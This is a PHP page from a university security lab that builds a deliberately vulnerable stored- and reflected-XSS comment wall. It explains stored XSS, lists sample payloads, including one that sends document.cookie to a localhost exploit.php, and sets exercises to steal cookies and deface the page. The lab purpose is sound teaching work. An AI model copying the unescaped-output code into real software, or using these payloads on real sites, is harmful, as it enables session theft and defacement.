<?php
/**
 * Práctica 3: Criptografía y Seguridad - Grupo: 7122 [cite: 5]
 * Universidad Nacional Autónoma de México - Facultad de Ciencias [cite: 3, 4]
 * * INSTRUCCIONES ORIGINALES DE CONEXIÓN:
 * $ mysql -uroot -p
 * mysql> CREATE USER 'ximena'@'localhost' IDENTIFIED BY '12345';
 * mysql> FLUSH PRIVILEGES;
 * mysql> GRANT ALL PRIVILEGES ON * . * TO 'ximena'@'localhost';
 * mysql> CREATE DATABASE storexss;
 * mysql> CREATE TABLE comentarios (comentario VARCHAR(50) NOT NULL);
 */

// ACTIVAR MODO DEBUG PARA ARCH LINUX
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Credenciales según tu archivo original
$servername = "127.0.0.1";
$database = "storexss";
$username = "kyogre236";
$password = "admin123";
$secret = ""; // Encuentra el nombre escondido

$link = mysqli_connect($servername, $username, $password, $database);

if (!$link) {
    echo "<div class='card' style='color:red;'>";
    echo "<b>Error: Unable to connect to MySQL.</b>" . PHP_EOL;
    echo "<br>Debugging errno: " . mysqli_connect_errno() . PHP_EOL;
    echo "<br>Debugging error: " . mysqli_connect_error() . PHP_EOL;
    echo "</div>";
    exit;
}

$mensaje_status = "";

// Eliminar todos los datos de la tabla
if (isset($_POST['clear'])) {
    $truncate_querry = "TRUNCATE TABLE comentarios";
    if (mysqli_multi_query($link, $truncate_querry)) {
        $mensaje_status = "Se depuró la tabla.";
    } else {
        $mensaje_status = "Error: " . mysqli_error($link);
    }
}

// Crea una Cookie de manera aleatoria
if (isset($_POST['newCookie'])) {
    $cookie_name = "authKey";
    $cookie_value = md5(microtime());
    setcookie($cookie_name, $cookie_value, time() + (86400 * 30), "/");
    $mensaje_status = "authKey Cookie SET!";
}

// Agrega comentarios a una base de datos (VULNERABLE POR DISEÑO)
if (isset($_POST['comentario'])) {
    $insert_sql = "INSERT INTO comentarios (comentario) VALUES ('".addslashes($_POST['comentario'])."')";
    if ($link->query($insert_sql) === TRUE) {
        $mensaje_status = "New record created successfully";
    } else {
        $mensaje_status = "Error: Unable to add comentario";
    }
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>StoreXSS | Laboratorio Facultad de Ciencias</title>
<style>
:root { --primary: #0b7dda; --bg: #f8fafc; --text: #1e293b; --card: #ffffff; }
body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); padding: 20px; line-height: 1.6; }
.container { max-width: 900px; margin: auto; }
.card { background: var(--card); padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); margin-bottom: 25px; border: 1px solid #e2e8f0; }
h1, h2, h3 { color: var(--primary); margin-top: 0; }
.status-msg { background: #dcfce7; color: #166534; padding: 10px; border-radius: 8px; margin-bottom: 20px; text-align: center; font-weight: bold; }
.payload-box { background: #f1f5f9; padding: 15px; border: 1px solid #cbd5e1; border-radius: 8px; font-family: monospace; margin: 10px 0; }
textarea { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #cbd5e1; margin-bottom: 10px; }
input[type="submit"], button { background: var(--primary); color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: 600; margin: 5px 2px; }
.comment-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
.comment-cell { background: #fff; border: 1px solid #e2e8f0; padding: 15px; border-left: 5px solid var(--primary); }
</style>
</head>
<body>

<div class="container">
<?php if($mensaje_status) echo "<div class='status-msg'>$mensaje_status</div>"; ?>

<div class="card">
<h1> StoreXSS Ejemplo </h1>
<p>XSS es una técnica de ataque que inyecta código malicioso en aplicaciones web vulnerables. A diferencia de otros ataques, esta técnica no se dirige al servidor web en sí, sino al navegador del usuario.</p>

<p>El XSS almacenado es un tipo de XSS que almacena código malicioso en el servidor de aplicaciones. El uso de XSS almacenado solo es posible si su aplicación está diseñada para almacenar la entrada del usuario como en los siguientes ejemplos.</p>

<p>Un Stored cross-site scripting surge cuando una aplicación recibe datos de una fuente que no es de confianza e incluye esos datos dentro de sus respuestas HTTP posteriores de una manera insegura. </p>

<h3>Un ataque XSS almacenado normalmente funciona de la siguiente manera:</h3>
<ul>
<li>Un atacante inyecta código malicioso en una solicitud para enviar contenido a la aplicación. </li>
<li>La aplicación cree que la solicitud es inocente, procesa la entrada del usuario y la almacena en la base de datos. </li>
<li>A partir de este momento, cada vez que el contenido enviado se muestra a los usuarios, el código malicioso se ejecuta en sus navegadores. </li>
</ul>
</div>

<div class="card">
<h3>Impacto de los ataques XSS almacenados:</h3>
<ul>
<li>Obtener la sesión del usuario y realizar acciones en su nombre </li>
<li>Robar las credenciales del usuario [cite: 59]</li>
<li>Secuestro del navegador del usuario o entrega de exploits basados en el navegador </li>
<li>Escaneo de puertos de los hosts a los que la aplicación web puede conectarse</li>
<li>Desfiguración del sitio web</li>
</ul>
<p>Si un atacante puede controlar un script que se ejecuta en el navegador de la víctima, entonces normalmente puede comprometer completamente a ese usuario. </p>
</div>

<div class="card">
<h3>Ejemplos de Payloads</h3>
<p>Para llevar a cabo un ataque, basta con pasar código a alguna caja de texto. Por ejemplo:</p>
<div class="payload-box">&lt;p&gt; Confia en mi! &lt;/p&gt;&lt;script src=”http://localhost/Proyecto03/exploit.php”&gt; &lt;/script&gt;</div>

<p>También puede dejar direccionamientos como:</p>
<div class="payload-box">&lt;p&gt; Seguro te gustará:&lt;a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ"&gt;https://www.freephpnes.com/&lt;/a&gt;&lt;/p&gt;</div>

<p>O esconder tu código malicioso en un link aparentemente normal:</p>
<div class="payload-box">&lt;a href="https://www.youtube.com/watch?v=8UVNT4wvIGY" onmouseover="window.location='http://localhost/Proyecto03/exploit.php?cookie='+escape(document.cookie)"&gt; Gotye - Somebody That I Used To Know &lt;/a&gt;</div>
</div>

<div class="card" style="border-left: 5px solid #ef4444;">
<h3>Ahora te toca a ti. Realiza los siguientes exploits:</h3>
<ul>
<li>Roba las cookies que genera la página. </li>
<li>Un comentario con un direccionamiento oculto a un video de YouTube. </li>
<li>Guarda en la base de datos un script que muestre una alerta de "hackeado". </li>
<li>Altera la página para que ya no se pueda acceder a ella. </li>
</ul>
</div>

<div class="card">
<h3>Muro de Comentarios</h3>
<table class="comment-table">
<?php
$sql = "SELECT comentario FROM comentarios";
$result = $link->query($sql);
if ($result && $result->num_rows > 0) {
    while($row = $result->fetch_assoc()) {
        echo "<tr><td class='comment-cell'><b>Comentario:</b><br><hr>".$row["comentario"]."</td></tr>";
    }
} else {
    echo "<tr><td class='comment-cell'>Sin Comentarios!</td></tr>";
}
?>
</table>
</div>

<div class="card">
<form action="storeXss.php" method="post">
<textarea rows="4" name="comentario" placeholder="Deja un comentario" maxlength="400"></textarea>
<input type="submit" value="Publicar Comentario" />
</form>

<hr>

<form action="storeXss.php" method="post">
<input type="submit" name="newCookie" value="New Cookie" />
<input type="submit" name="outputCookie" value="Output Cookie" />
<input type="submit" name="clear" value="Debug: Clear Table" style="background:#ef4444;" />
</form>

<?php
if (isset($_POST['outputCookie']) && isset($_COOKIE['authKey'])) {
    echo "<p style='text-align:center;'><b>authKey Cookie:</b> ".$_COOKIE['authKey']."</p>";
}
?>

<hr>

<form action="storeXss.php" method="get">
Name: <input type="text" name="name" style="padding:5px; border-radius:4px; border:1px solid #ccc;" />
<input type="submit" value="Submit Name" />
</form>

<?php
if (isset($_GET['name'])) {
    echo "<p align='center'>Hola ".$_GET['name']."! Bienvenido!</p>";
    if($_GET['name'] == $secret && $secret !== ""){
        echo '<script>alert("Tenemos un invitado muy especial! Bienvenido!"); window.location.href="https://es.wikipedia.org/wiki/Cross-site_scripting";</script>';
    }
}
?>
</div>

<div style="text-align: left; padding-bottom: 50px;">
<a href="reflectedXxs.php"><button>← Anterior (Reflected)</button></a>
</div>
</div>

</body>
</html>
<?php $link->close(); ?>
